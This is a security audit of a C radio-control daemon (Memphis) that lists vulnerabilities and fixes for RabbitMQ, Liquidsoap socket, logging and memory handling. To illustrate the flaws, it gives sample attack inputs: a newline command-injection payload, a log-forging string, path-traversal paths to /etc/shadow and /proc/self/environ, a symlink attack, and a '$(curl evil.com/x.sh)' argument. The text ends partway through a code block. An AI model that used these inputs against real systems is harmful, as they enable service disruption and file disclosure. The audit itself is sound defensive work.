# 🔒 Security & Memory Audit — Memphis v0.1.0

**Auditor**: Security Consultant (Network + Application)  
**Date**: 2026-04-20  
**Scope**: Full codebase review (src/, include/, test/, scripts/, Makefile, CMakeLists.txt)  
**Methodology**: Manual static analysis, threat modeling, secure coding review

---

## Executive Summary

Memphis está em fase de skeleton (Phase 1-2) e apresenta **46 achados**, sendo **8 críticos** que precisam ser resolvidos antes de qualquer deploy. A maioria dos problemas são corrigíveis antes da implementação das fases P1.1-P1.4, o que é **oportunidade ideal** para build security-in.

### Severidade Distribution

| Severidade | Qty | Ação |
|---|---|---|
| 🔴 **CRÍTICO** | 8 | Bloquear deploy até fix |
| 🟠 **ALTO** | 12 | Corrigir antes de produção |
| 🟡 **MÉDIO** | 16 | Fix em sprint de hardening |
| 🟢 **BAIXO** | 10 | Melhorias ao longo do tempo |

### Top-3 Riscos

1. **Command injection via Liquidsoap socket** — attacker pode injetar `shutdown` via payload
2. **Credenciais default fracas** (`guest/guest`) hardcoded
3. **Sem TLS** em qualquer conexão (AMQP + LS plaintext)

---

## 🔴 CRÍTICOS (Bloqueiam Deploy)

### ISSUE-001: Command Injection no Liquidsoap Socket
**Severity**: 🔴 CRITICAL  
**CWE**: CWE-77 (Command Injection)  
**Files**: `src/liquidsoap_client.c` (quando implementado), `docs/API.md`

**Descrição**:  
Protocolo Liquidsoap usa newline (`\n`) como delimitador de comandos. Se o `filepath` do payload `announcement.push` não é validado, attacker pode injetar comandos adicionais:

```json
{
  "event": "announcement.push",
  "payload": {
    "filepath": "/tmp/x.mp3\nshutdown\n"
  }
}
```

Ao enviar `announcements.push /tmp/x.mp3\nshutdown\n` ao socket, Liquidsoap executa **dois comandos**: o push e o shutdown. Resultado: attacker derruba a rádio.

**Impacto**: DoS, execução arbitrária de comandos LS, possível RCE via comandos custom do LS.

**Proposta de Correção**:
```c
/* Em liquidsoap_client.c */
static bool is_safe_ls_arg(const char *arg) {
  if (arg == NULL) return false;
  for (const char *p = arg; *p; p++) {
    if (*p == '\n' || *p == '\r' || *p == '\0') return false;
    /* Whitelist: apenas chars seguros para paths e metadados */
    if (!isprint((unsigned char)*p)) return false;
  }
  return strlen(arg) < 1024;  /* max arg size */
}

ls_response_t *ls_send_command(ls_socket_t *sock, const char *command) {
  if (sock == NULL || command == NULL) return NULL;
  if (!is_safe_ls_arg(command)) {
    log_msg(LOG_WARN, "ls_client", "rejected unsafe command", NULL, NULL);
    return NULL;
  }
  /* ... */
}
```

E **nunca** concatenar input direto no comando:
```c
/* ERRADO */
snprintf(cmd, sizeof(cmd), "announcements.push %s", filepath);

/* CERTO: validar + escapar + whitelist de paths permitidos */
if (!is_path_in_allowlist(filepath)) return ERROR;
if (!is_safe_ls_arg(filepath)) return ERROR;
snprintf(cmd, sizeof(cmd), "announcements.push %s", filepath);
```

---

### ISSUE-002: Credenciais Default Fracas (guest/guest)
**Severity**: 🔴 CRITICAL  
**CWE**: CWE-798 (Use of Hard-coded Credentials), CWE-521 (Weak Password)  
**Files**: `src/config.c:16-17`, `memphis.env.example`, `scripts/setup-amqp.sh:35`

**Descrição**:  
Defaults `guest/guest` são credenciais bem conhecidas do RabbitMQ. Pior: se esquecerem de mudar, qualquer pessoa na rede pode publicar comandos no bus.

```c
cfg->rabbitmq_user = strdup("guest");
cfg->rabbitmq_pass = strdup("guest");  /* 💀 */
```

E `scripts/setup-amqp.sh:35` sugere senha fraca:
```bash
sudo rabbitmqctl add_user memphis memphis123
```

**Impacto**: Autenticação trivial, attacker manda qualquer comando pra rádio.

**Proposta de Correção**:
1. **Remover defaults de credenciais no código**:
```c
/* ERRADO */
cfg->rabbitmq_pass = strdup("guest");

/* CERTO — exigir configuração explícita */
cfg->rabbitmq_pass = NULL;  /* Lido de env var RABBITMQ_PASS */
```

2. **Validação exige credenciais**:
```c
bool config_is_valid(const config_t *cfg) {
  if (cfg == NULL) return false;
  if (cfg->rabbitmq_host == NULL) return false;
  if (cfg->rabbitmq_user == NULL || strlen(cfg->rabbitmq_user) == 0) {
    fprintf(stderr, "ERROR: RABBITMQ_USER not set\n");
    return false;
  }
  if (cfg->rabbitmq_pass == NULL || strlen(cfg->rabbitmq_pass) < 12) {
    fprintf(stderr, "ERROR: RABBITMQ_PASS must be >=12 chars\n");
    return false;
  }
  return true;
}
```

3. **setup-amqp.sh**: gerar senha forte aleatória, não hardcoded:
```bash
MEMPHIS_PASS=$(openssl rand -base64 32)
rabbitmqctl add_user memphis "$MEMPHIS_PASS"
echo "Save this password: $MEMPHIS_PASS"
```

4. **memphis.env.example**: usar placeholders óbvios:
```
RABBITMQ_PASS=__CHANGE_ME_USE_STRONG_PASSWORD__
```

---

### ISSUE-003: Sem TLS para RabbitMQ (Credenciais em Plaintext)
**Severity**: 🔴 CRITICAL  
**CWE**: CWE-319 (Cleartext Transmission)  
**Files**: `src/rabbitmq_consumer.c`, `docs/ARCHITECTURE.md`

**Descrição**:  
Conexão AMQP é `amqp://` (plaintext). Credenciais, mensagens e respostas trafegam sem criptografia. Se RabbitMQ está em host diferente ou rede compartilhada, MitM captura tudo.

**Impacto**: Credenciais roubadas, mensagens interceptadas/injetadas.

**Proposta de Correção**:
```c
/* Usar AMQPS (TLS) */
#include <amqp_ssl_socket.h>

amqp_socket_t *socket = amqp_ssl_socket_new(conn);
amqp_ssl_socket_set_verify_peer(socket, 1);
amqp_ssl_socket_set_verify_hostname(socket, 1);
amqp_ssl_socket_set_cacert(socket, cfg->ca_cert_path);

/* Porta TLS é 5671 (não 5672) */
if (amqp_socket_open(socket, cfg->rabbitmq_host, 5671) != AMQP_STATUS_OK) {
  return NULL;
}
```

Adicionar ao config:
```c
typedef struct {
  /* ... */
  bool rabbitmq_tls_enabled;
  char *rabbitmq_ca_cert;
  char *rabbitmq_client_cert;
  char *rabbitmq_client_key;
  bool rabbitmq_verify_peer;
} config_t;
```

---

### ISSUE-004: Memory Corruption em main.c — cfg->log_level Aliasing
**Severity**: 🔴 CRITICAL  
**CWE**: CWE-415 (Double Free), CWE-416 (Use After Free)  
**Files**: `src/main.c:76`

**Descrição**:
```c
if (log_level != NULL) {
  cfg->log_level = (char *)log_level;  /* 💀 */
}
```

1. **Memory leak**: `cfg->log_level` já apontava para `strdup("INFO")`. Sobrescrever sem `free` vaza memória.
2. **Segfault iminente**: `log_level` vem de `optarg` (aponta pra `argv[]`). Depois `config_free(cfg)` faz `free(cfg->log_level)` que é `free(argv[i])` → **heap corruption**, segfault.

**Impacto**: Crash garantido ao usar `-l LEVEL`.

**Proposta de Correção**:
```c
if (log_level != NULL) {
  if (cfg->log_level) free(cfg->log_level);
  cfg->log_level = strdup(log_level);
  if (cfg->log_level == NULL) {
    fprintf(stderr, "OOM\n");
    config_free(cfg);
    return 1;
  }
}
```

---

### ISSUE-005: Symlink Attack no Log File
**Severity**: 🔴 CRITICAL  
**CWE**: CWE-59 (Link Following)  
**Files**: `src/memphis_logging.c:17`

**Descrição**:
```c
logfile = fopen(logfile_path, "a");
```

Se `/var/log/memphis.log` for um symlink (pre-existente ou criado por attacker), `fopen("a")` segue o link e escreve no target. Se memphis roda como root (daemon systemd), attacker cria symlink antes: `/var/log/memphis.log → /etc/shadow`. Log message vira append em `/etc/shadow`.

**Impacto**: Corrupção de arquivos críticos do sistema, potencial privilege escalation.

**Proposta de Correção**:
```c
#include <fcntl.h>

void log_init(log_level_t level, const char *logfile_path) {
  log_level = level;
  if (logfile_path == NULL || strcmp(logfile_path, "stdout") == 0) {
    logfile = stdout;
    return;
  }
  /* O_NOFOLLOW: falha se for symlink
   * O_CREAT | O_APPEND: cria se não existe, append-only
   * 0600: apenas owner lê/escreve */
  int fd = open(logfile_path,
                O_WRONLY | O_CREAT | O_APPEND | O_NOFOLLOW | O_CLOEXEC,
                0600);
  if (fd < 0) {
    fprintf(stderr, "ERROR: cannot open log file safely: %s\n",
            strerror(errno));
    logfile = stderr;  /* fallback seguro */
    return;
  }
  logfile = fdopen(fd, "a");
  if (logfile == NULL) {
    close(fd);
    logfile = stderr;
  }
}
```

---

### ISSUE-006: Log Injection (JSON Escape Missing)
**Severity**: 🔴 CRITICAL (em termos de audit integrity)  
**CWE**: CWE-117 (Improper Output Neutralization for Logs), CWE-93 (CRLF Injection)  
**Files**: `src/memphis_logging.c:36-44`

**Descrição**:  
Logs são escritos como JSON mas nenhum campo é escapado. Attacker manda message com aspas/newline e quebra o JSON:

```c
fprintf(logfile, ",\"message\":\"%s\"", message);
```

Se `message = foo","level":"CRITICAL","fake":"true`, o log vira:
```json
{"timestamp":"...", "message":"foo","level":"CRITICAL","fake":"true"}
```

**Impacto**: Logs corrompidos, attacker forja entradas, SIEM/audit pipeline quebra, evasão de detecção.

**Proposta de Correção**:
```c
/* Escape mínimo para JSON strings */
static void json_escape_write(FILE *fp, const char *s) {
  fputc('"', fp);
  for (const char *p = s; *p; p++) {
    unsigned char c = (unsigned char)*p;
    switch (c) {
      case '"':  fputs("\\\"", fp); break;
      case '\\': fputs("\\\\", fp); break;
      case '\n': fputs("\\n", fp); break;
      case '\r': fputs("\\r", fp); break;
      case '\t': fputs("\\t", fp); break;
      case '\b': fputs("\\b", fp); break;
      case '\f': fputs("\\f", fp); break;
      default:
        if (c < 0x20) fprintf(fp, "\\u%04x", c);
        else fputc(c, fp);
    }
  }
  fputc('"', fp);
}

/* Usar em log_msg: */
if (message) {
  fputs(",\"message\":", logfile);
  json_escape_write(logfile, message);
}
```

**Alternativa melhor**: usar `jansson` para construir o JSON, já que temos a lib:
```c
json_t *log = json_object();
json_object_set_new(log, "timestamp", json_string(ts));
json_object_set_new(log, "level", json_string(level_names[level]));
if (message) json_object_set_new(log, "message", json_string(message));
char *out = json_dumps(log, JSON_COMPACT);
fprintf(logfile, "%s\n", out);
free(out);
json_decref(log);
```

---

### ISSUE-007: Socket Timeout Never Applied (DoS)
**Severity**: 🔴 CRITICAL  
**CWE**: CWE-400 (Uncontrolled Resource Consumption)  
**Files**: `src/liquidsoap_client.c:27,43-68`

**Descrição**:  
`sock->timeout_ms = timeout_ms;` é armazenado mas **nunca aplicado** ao socket. Nenhum `SO_RCVTIMEO`, `SO_SNDTIMEO`, nem timeout em `connect()`.

Se Liquidsoap trava, `connect()` e `recv()` bloqueiam indefinidamente. Loop principal trava. DoS trivial: conectar no port 1234 e não responder → Memphis freeze.

**Impacto**: DoS, rádio fica inresponsiva a comandos.

**Proposta de Correção**:
```c
#include <sys/time.h>

bool ls_reconnect(ls_socket_t *sock) {
  if (sock == NULL) return false;
  if (sock->fd >= 0) close(sock->fd);

  /* SOCK_CLOEXEC: FD não vaza pra forks */
  sock->fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (sock->fd < 0) return false;

  /* Timeouts */
  struct timeval tv = {
    .tv_sec = sock->timeout_ms / 1000,
    .tv_usec = (sock->timeout_ms % 1000) * 1000
  };
  setsockopt(sock->fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
  setsockopt(sock->fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

  /* Keepalive */
  int yes = 1;
  setsockopt(sock->fd, SOL_SOCKET, SO_KEEPALIVE, &yes, sizeof(yes));

  /* TCP_NODELAY for low-latency commands */
  setsockopt(sock->fd, IPPROTO_TCP, TCP_NODELAY, &yes, sizeof(yes));

  /* Connect with timeout (non-blocking + select) */
  if (connect_with_timeout(sock->fd, &addr, sock->timeout_ms) < 0) {
    close(sock->fd); sock->fd = -1;
    return false;
  }
  sock->connected = true;
  return true;
}
```

---

### ISSUE-008: Path Traversal em announcement.push (Potencial)
**Severity**: 🔴 CRITICAL (quando feature for implementada)  
**CWE**: CWE-22 (Path Traversal)  
**Files**: `docs/API.md` (spec), `src/ls_controller.c` (implementação futura)

**Descrição**:  
API aceita `filepath` arbitrário no payload. Sem validação, attacker manda:
```json
{"event": "announcement.push", "payload": {"filepath": "/etc/shadow"}}
```

Ou path traversal: `../../etc/passwd`, `/proc/self/environ` (vaza env vars), symlinks, devices.

**Impacto**: Leitura de arquivos sensíveis (via logs de erro do LS), potencial DoS (tocar /dev/urandom).

**Proposta de Correção**:
```c
#include <limits.h>

static bool is_allowed_audio_path(const char *path) {
  if (path == NULL) return false;
  /* Resolve absolute path (previne traversal) */
  char resolved[PATH_MAX];
  if (realpath(path, resolved) == NULL) return false;

  /* Must be inside allowlisted directories */
  const char *allowed_prefixes[] = {
    "/opt/radio/audio/announcements/",
    "/opt/radio/audio/jingles/",
    "/opt/radio/playlists/",
    NULL
  };
  for (int i = 0; allowed_prefixes[i]; i++) {
    if (strncmp(resolved, allowed_prefixes[i],
                strlen(allowed_prefixes[i])) == 0) {
      /* Must end with .mp3, .ogg, .wav */
      const char *ext = strrchr(resolved, '.');
      if (ext && (strcmp(ext, ".mp3") == 0 ||
                  strcmp(ext, ".ogg") == 0 ||
                  strcmp(ext, ".wav") == 0)) {
        return true;
      }
    }
  }
  return false;
}
```

---

## 🟠 ALTOS

### ISSUE-009: malloc sem calloc — Uninitialized Memory
**Severity**: 🟠 HIGH  
**CWE**: CWE-457 (Use of Uninitialized Variable)  
**Files**: `src/config.c:9`, `src/message.c:14`, `src/liquidsoap_client.c:21,76`, `src/rabbitmq_consumer.c:17`, `src/ls_controller.c:15`

**Descrição**:  
Vários `malloc()` sem zerar a memória. Se `strdup` subsequente falha por OOM, campos ficam com lixo. `config_free` verifica `if (cfg->field)`, mas lixo ≠ NULL → free em pointer inválido → **heap corruption**.

```c
config_t *cfg = malloc(sizeof(config_t));  /* campos não inicializados */
cfg->rabbitmq_host = strdup("localhost");  /* OK */
cfg->rabbitmq_user = strdup("guest");      /* OOM → retorna NULL */
cfg->rabbitmq_pass = strdup("guest");      /* pula, pass fica com lixo */
/* ... */
config_free(cfg);  /* tenta free(cfg->rabbitmq_vhost) que é lixo → CRASH */
```

**Proposta de Correção**: Usar `calloc()`:
```c
config_t *cfg = calloc(1, sizeof(config_t));  /* tudo zerado */
```

Aplicar em todas as 6 ocorrências.

---

### ISSUE-010: Credenciais Podem Vazar em Core Dumps
**Severity**: 🟠 HIGH  
**CWE**: CWE-528 (Exposure of Core Dump)  
**Files**: `src/config.c`

**Descrição**:  
`rabbitmq_pass` fica em memória heap durante toda execução. Se processo crash, core dump contém senha em plaintext. Se atacker acessa o core file, lê senha.

**Proposta de Correção**:
1. Desabilitar core dumps em produção:
```c
#include <sys/resource.h>

static void disable_core_dumps(void) {
  struct rlimit rl = { 0, 0 };
  setrlimit(RLIMIT_CORE, &rl);
  /* Também desabilitar ptrace (prctl PR_SET_DUMPABLE 0) */
  prctl(PR_SET_DUMPABLE, 0);
}
```

2. Limpar senha após uso:
```c
void config_free(config_t *cfg) {
  if (cfg->rabbitmq_pass) {
    /* Sobrescrever antes de free para não deixar em memória */
    volatile char *p = cfg->rabbitmq_pass;
    while (*p) *p++ = 0;
    free(cfg->rabbitmq_pass);
  }
  /* ... */
}
```

3. Minimizar tempo em memória: passar senha direto pra AMQP, não guardar em struct.

---

### ISSUE-011: Sem DNS Resolution (hostname só aceita IP)
**Severity**: 🟠 HIGH  
**CWE**: CWE-1188 (Insecure Default Initialization)  
**Files**: `src/liquidsoap_client.c:58`

**Descrição**:
```c
inet_pton(AF_INET, sock->host, &addr.sin_addr);
```

`inet_pton` só aceita IP literal. Se `host = "liquidsoap.internal"`, retorna 0 (erro silencioso). `sin_addr` fica zerado → conecta em `0.0.0.0:1234` (qualquer interface local).

**Retorno não verificado**: `inet_pton` retorna 0 em erro, -1 em erro de família, 1 em sucesso. Código ignora.

**Impacto**: Conexão em endereço errado, comportamento imprevisível.

**Proposta de Correção**: Usar `getaddrinfo()`:
```c
struct addrinfo hints = {0}, *result = NULL;
hints.ai_family = AF_UNSPEC;  /* IPv4 ou IPv6 */
hints.ai_socktype = SOCK_STREAM;
char port_str[8];
snprintf(port_str, sizeof(port_str), "%u", sock->port);

int rc = getaddrinfo(sock->host, port_str, &hints, &result);
if (rc != 0) {
  log_msg(LOG_ERROR, "ls_client", gai_strerror(rc), NULL, NULL);
  return false;
}
/* Tentar cada endereço até um conectar */
for (struct addrinfo *r = result; r; r = r->ai_next) {
  sock->fd = socket(r->ai_family, r->ai_socktype | SOCK_CLOEXEC,
                    r->ai_protocol);
  if (sock->fd < 0) continue;
  if (connect(sock->fd, r->ai_addr, r->ai_addrlen) == 0) break;
  close(sock->fd); sock->fd = -1;
}
freeaddrinfo(result);
```

---

### ISSUE-012: Use-After-Free Potencial em ls_socket
**Severity**: 🟠 HIGH  
**CWE**: CWE-416 (Use After Free)  
**Files**: `src/liquidsoap_client.c:25`, `src/ls_controller.c:23-25`

**Descrição**:
```c
/* liquidsoap_client.c */
struct ls_socket {
  const char *host;  /* 💀 apenas ponteiro */
};
sock->host = host;  /* não copia */
```

```c
/* ls_controller.c */
ctrl->ls_sock = ls_socket_create(cfg->liquidsoap_host, ...);
```

Se `cfg` é liberado antes de `ctrl->ls_sock`, `sock->host` é dangling pointer. Qualquer `ls_reconnect` subsequente → UAF.

**Proposta de Correção**: Copiar a string:
```c
struct ls_socket {
  char *host;  /* owned */
  /* ... */
};

ls_socket_t *ls_socket_create(const char *host, ...) {
  ls_socket_t *sock = calloc(1, sizeof(*sock));
  if (!sock) return NULL;
  sock->host = strdup(host);
  if (!sock->host) { free(sock); return NULL; }
  /* ... */
}

void ls_socket_free(ls_socket_t *sock) {
  if (!sock) return;
  free(sock->host);
  if (sock->fd >= 0) close(sock->fd);
  free(sock);
}
```

---

### ISSUE-013: signal() em vez de sigaction()
**Severity**: 🟠 HIGH  
**CWE**: CWE-364 (Signal Handler Race Condition)  
**Files**: `src/main.c:84-85`

**Descrição**:
```c
signal(SIGTERM, handle_signal);
signal(SIGINT, handle_signal);
```

`signal()` tem semântica indefinida em sistemas System V: após disparar, handler pode ser resetado para default. Race condition: sinal chega durante handling → comportamento indefinido.

**Proposta de Correção**:
```c
static void setup_signals(void) {
  struct sigaction sa = {0};
  sa.sa_handler = handle_signal;
  sigemptyset(&sa.sa_mask);
  sa.sa_flags = SA_RESTART;  /* interrupted syscalls restart */

  sigaction(SIGTERM, &sa, NULL);
  sigaction(SIGINT, &sa, NULL);

  /* Ignorar SIGPIPE (socket write quando peer fechou) */
  sa.sa_handler = SIG_IGN;
  sigaction(SIGPIPE, &sa, NULL);
}
```

---

### ISSUE-014: SIGPIPE Não Tratado (Process Suicide)
**Severity**: 🟠 HIGH  
**CWE**: CWE-248 (Uncaught Exception)  
**Files**: `src/main.c` (não trata)

**Descrição**:  
Socket write em peer fechado → kernel manda `SIGPIPE` → processo morre por default. Liquidsoap reinicia → Memphis crasha junto.

**Proposta de Correção**: Ver ISSUE-013 (ignorar SIGPIPE via sigaction).  
Alternativa: usar `send(fd, buf, len, MSG_NOSIGNAL)` em cada write.

---

### ISSUE-015: Sem Privilege Dropping
**Severity**: 🟠 HIGH  
**CWE**: CWE-250 (Execution with Unnecessary Privileges)  
**Files**: `src/main.c`, `scripts/` (systemd service futuro)

**Descrição**:  
Se Memphis é iniciado como root (systemd), roda com UID 0 permanentemente. Não há necessidade — só precisa de socket TCP local.

**Proposta de Correção**:
```c
#include <pwd.h>
#include <unistd.h>

static bool drop_privileges(const char *username) {
  if (geteuid() != 0) return true;  /* já não é root */
  struct passwd *pw = getpwnam(username);
  if (!pw) return false;

  /* Drop supplementary groups ANTES de setuid */
  if (setgroups(0, NULL) < 0) return false;
  if (setgid(pw->pw_gid) < 0) return false;
  if (setuid(pw->pw_uid) < 0) return false;

  /* Verify: não deve ser possível voltar a root */
  if (setuid(0) != -1) {
    fprintf(stderr, "FATAL: still have root privileges\n");
    return false;
  }
  return true;
}
```

E no systemd service:
```ini
[Service]
User=memphis
Group=memphis
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=yes
PrivateTmp=yes
CapabilityBoundingSet=
```

---

### ISSUE-016: localtime() Não Thread-Safe
**Severity**: 🟠 HIGH  
**CWE**: CWE-366 (Race Condition within Thread)  
**Files**: `src/memphis_logging.c:32`

**Descrição**:
```c
struct tm *tm_info = localtime(&now);
```

`localtime()` retorna ponteiro para buffer estático — race em multi-thread. Quando o consumer tiver thread separada ou http healthcheck, logs ficam intercalados e/ou crashes.

**Proposta de Correção**:
```c
struct tm tm_info;
gmtime_r(&now, &tm_info);  /* UTC, não localtime */
char timestamp[32];
strftime(timestamp, sizeof(timestamp), "%Y-%m-%dT%H:%M:%SZ", &tm_info);
```

Bonus: usar UTC (sufixo `Z`) em logs é standard para correlação.

---

### ISSUE-017: Sem Rate Limiting / Message Size Limit
**Severity**: 🟠 HIGH  
**CWE**: CWE-770 (Allocation of Resources Without Limits)  
**Files**: `src/rabbitmq_consumer.c` (quando implementar loop)

**Descrição**:  
Sem limits, attacker pode:
- Flooding: 100k msgs/s inundam fila, consumer não dá conta
- Large msg: payload de 10GB esgota memória

**Proposta de Correção**:
```c
#define MAX_MESSAGE_SIZE (64 * 1024)  /* 64KB suficiente */

if (envelope.message.body.len > MAX_MESSAGE_SIZE) {
  log_msg(LOG_WARN, "consumer", "message too large, dropped", NULL, NULL);
  amqp_basic_nack(conn, channel, envelope.delivery_tag, 0, 0);  /* DLQ */
  continue;
}

/* QoS prefetch=1 já limita concorrência */
amqp_basic_qos(conn, channel, 0, 1, 0);
```

Em nível de AMQP:
```
policy: { "max-length": 10000, "max-length-bytes": 10485760 }
```

---

### ISSUE-018: Missing `-D_FORTIFY_SOURCE`, `-fstack-protector-strong`, PIE
**Severity**: 🟠 HIGH  
**CWE**: CWE-1125 (Excessive Attack Surface)  
**Files**: `CMakeLists.txt`, `Makefile`

**Descrição**:  
Build flags atuais: `-Wall -Wextra -Wpedantic`. Faltam hardening flags.

**Proposta de Correção**:
```cmake
# CMakeLists.txt
set(HARDENING_FLAGS
  "-D_FORTIFY_SOURCE=2"
  "-fstack-protector-strong"
  "-fstack-clash-protection"
  "-fcf-protection=full"  # Intel CET
  "-fPIE"
  "-fno-common"
  "-Wformat"
  "-Wformat-security"
  "-Werror=format-security"
  "-Werror=implicit-function-declaration"
)
set(LINK_HARDENING
  "-pie"
  "-Wl,-z,relro"
  "-Wl,-z,now"
  "-Wl,-z,noexecstack"
  "-Wl,-z,separate-code"
)

if(CMAKE_BUILD_TYPE STREQUAL "Release")
  add_compile_options(${HARDENING_FLAGS})
  add_link_options(${LINK_HARDENING})
endif()

# Debug: add sanitizers
if(CMAKE_BUILD_TYPE STREQUAL "Debug")
  add_compile_options(-fsanitize=address -fsanitize=undefined)
  add_link_options(-fsanitize=address -fsanitize=undefined)
endif()
```

Verificar depois com `checksec`:
```
$ checksec --file=build/memphis
RELRO     STACK CANARY   NX   PIE   RPATH   Fortified
Full      Yes            Yes  Yes   No      Yes
```

---

### ISSUE-019: inet_pton Retorno Não Verificado
**Severity**: 🟠 HIGH  
**CWE**: CWE-252 (Unchecked Return Value)  
**Files**: `src/liquidsoap_client.c:58`

**Descrição**: Ver ISSUE-011. Retorno é 0/-1/1 mas ignorado.

**Proposta**: Integrado na ISSUE-011 (migrar para getaddrinfo).

---

### ISSUE-020: Default Log File em /var/log sem Permissões
**Severity**: 🟠 HIGH  
**CWE**: CWE-732 (Incorrect Permission Assignment)  
**Files**: `src/memphis_logging.c:17`, `src/config.c:27`

**Descrição**:  
`fopen(path, "a")` usa umask do processo. Default umask 022 → arquivo criado com 0644 (world-readable). Logs podem conter sensitive info.

**Proposta**: Integrado na ISSUE-005 (usar `open` com modo 0600).

---

## 🟡 MÉDIOS

### ISSUE-021: Sem Signing/HMAC nas Mensagens
**Severity**: 🟡 MEDIUM  
**CWE**: CWE-345 (Insufficient Verification of Data Authenticity)  
**Files**: `docs/API.md`, protocolo

**Descrição**:  
Qualquer producer com acesso ao RabbitMQ pode publicar mensagens. Não há verificação de origem.

**Proposta**: Adicionar campo `signature` (HMAC-SHA256):
```json
{
  "version": 1, "id": "...", "event": "control.skip",
  "signature": "base64(hmac_sha256(shared_secret, id + event + timestamp))"
}
```

Memphis valida antes de processar. Alternativa: mTLS para authentication em nível de conexão + ACL no RabbitMQ por user.

---

### ISSUE-022: Sem Replay Protection
**Severity**: 🟡 MEDIUM  
**CWE**: CWE-294 (Authentication Bypass by Capture-replay)  
**Files**: Schema de mensagem

**Descrição**:  
Se attacker captura mensagem assinada (ISSUE-021), pode replay. Sem `nonce` ou verificação de timestamp, Memphis re-executa.

**Proposta**: 
- Validar `timestamp` dentro de janela (ex: 60s)
- Manter cache de `message.id` vistos recentemente (bloom filter ou Redis com TTL)
- Rejeitar replays

---

### ISSUE-023: json_integer_value(NULL) 
**Severity**: 🟡 MEDIUM  
**CWE**: CWE-476 (NULL Pointer Dereference) — safe em jansson mas antipattern  
**Files**: `src/message.c:28`

**Descrição**:
```c
msg->version = json_integer_value(version_obj);  /* se NULL, retorna 0 */
```

Jansson retorna 0 para NULL, mas 0 ≠ "campo ausente". Pior: se alguém muda jansson ou reimplementa, pode crashar.

**Proposta**: Verificar tipo antes:
```c
json_t *version_obj = json_object_get(root, "version");
if (!json_is_integer(version_obj)) {
  message_free(msg);
  json_decref(root);
  return NULL;
}
msg->version = json_integer_value(version_obj);
```

---

### ISSUE-024: Integer Overflow/Underflow em version
**Severity**: 🟡 MEDIUM  
**CWE**: CWE-190 (Integer Overflow)  
**Files**: `src/message.c:28`

**Descrição**:  
`msg->version` é `uint32_t`, mas `json_integer_value` retorna `json_int_t` (int64_t). Se payload tem `"version": 99999999999`, trunca silenciosamente.

**Proposta**:
```c
json_int_t v = json_integer_value(version_obj);
if (v < 0 || v > UINT32_MAX) { /* rejeitar */ }
msg->version = (uint32_t)v;
```

---

### ISSUE-025: Sem Validação de Comprimento de Strings
**Severity**: 🟡 MEDIUM  
**CWE**: CWE-20 (Improper Input Validation)  
**Files**: `src/message.c:29-37`

**Descrição**:  
`id`, `event`, `timestamp` podem ter qualquer tamanho. Attacker manda 1GB de string → OOM.

**Proposta**:
```c
#define MAX_ID_LEN 64
#define MAX_EVENT_LEN 128
#define MAX_TIMESTAMP_LEN 32
#define MAX_SOURCE_LEN 64

static char *strdup_bounded(const char *s, size_t max) {
  if (!s) return NULL;
  size_t len = strnlen(s, max + 1);
  if (len > max) return NULL;
  return strndup(s, len);
}

msg->id = strdup_bounded(json_string_value(id_obj), MAX_ID_LEN);
if (!msg->id) { /* ... erro ... */ }
```

---

### ISSUE-026: Format String em Event Type (Potencial)
**Severity**: 🟡 MEDIUM  
**CWE**: CWE-134 (Format String)  
**Files**: `src/memphis_logging.c` (se event_type for usado em fprintf)

**Descrição**:  
Atualmente `fprintf(logfile, ",\"event_type\":\"%s\"", event_type)` usa `%s`. Se alguém mudar para `fprintf(logfile, event_type)` ingenuamente, format string attack.

**Proposta**: Comentário explícito + regra de code review. Adicionar `-Wformat-security` e `-Werror=format-security` (já em ISSUE-018).

---

### ISSUE-027: Log Level Validation Fraca
**Severity**: 🟡 MEDIUM  
**CWE**: CWE-20 (Improper Input Validation)  
**Files**: `src/config.c:61-77`

**Descrição**:  
Se `log_level` é string arbitrária, retorna `INFO` silenciosamente. Usuário pode achar que `"debugg"` (typo) está ativando debug.

**Proposta**:
```c
int config_get_log_level(const config_t *cfg) {
  if (cfg == NULL || cfg->log_level == NULL)
    return LOG_INFO;

  static const struct { const char *name; int level; } map[] = {
    {"DEBUG", LOG_DEBUG}, {"INFO", LOG_INFO},
    {"WARN", LOG_WARN}, {"ERROR", LOG_ERROR}, {"FATAL", LOG_FATAL},
    {NULL, -1}
  };
  for (int i = 0; map[i].name; i++)
    if (strcmp(cfg->log_level, map[i].name) == 0) return map[i].level;

  fprintf(stderr, "WARNING: unknown LOG_LEVEL '%s', using INFO\n",
          cfg->log_level);
  return LOG_INFO;
}
```

---

### ISSUE-028: Test Racy (test_socket_creation)
**Severity**: 🟡 MEDIUM  
**CWE**: CWE-1101 (Reliance on Runtime Component in Test)  
**Files**: `test/test_liquidsoap_client.c:22-38`

**Descrição**:  
Teste comporta-se diferente se LS está rodando ou não. Pode passar local mas quebrar em CI.

**Proposta**: Mock via LD_PRELOAD ou criar servidor de teste na porta:
```c
void test_socket_creation(void) {
  /* Criar mock server em porta aleatória */
  int server_fd = socket(AF_INET, SOCK_STREAM, 0);
  /* bind + listen */
  int port = get_bound_port(server_fd);

  ls_socket_t *sock = ls_socket_create("127.0.0.1", port, 1000);
  CU_ASSERT_PTR_NOT_NULL(sock);
  CU_ASSERT_TRUE(ls_is_connected(sock));
  ls_socket_free(sock);
  close(server_fd);
}
```

---

### ISSUE-029: getopt_long Não Valida Caracteres Perigosos no Argumento
**Severity**: 🟡 MEDIUM  
**CWE**: CWE-20  
**Files**: `src/main.c:41-59`

**Descrição**:  
`config_file` e `log_level` aceitos via CLI sem validação. Exemplo: `--config="$(curl evil.com/x.sh)"` (mas shell resolve antes). Internamente pode usar `config_file` em `open()` sem validar.

**Proposta**: Validar caracteres permitidos em path, ou usar `realpath` e checar dentro de dir permitido.

---

### ISSUE-030: Consumer amqp_new_connection sem verificar NULL
**Severity**: 🟡 MEDIUM  
**CWE**: CWE-252  
**Files**: `src/rabbitmq_consumer.c:26-30`

**Descrição**:
```c
consumer->conn = amqp_new_connection();
if (consumer->conn == NULL) {
  free(consumer);
  return NULL;
}
```

`amqp_new_connection()` pode retornar NULL em OOM. Check existe. OK. Mas falta:
- `amqp_socket_t` não criado ainda
- `login()` ainda não chamado
- `channel.open` ainda não chamado

**Proposta**: Implementação completa (deixado como stub):
```c
/* TODO na Phase 1.2 */
amqp_socket_t *socket = amqp_tcp_socket_new(consumer->conn);
if (!socket) return NULL;

int status = amqp_socket_open(socket, host, port);
if (status != AMQP_STATUS_OK) return NULL;

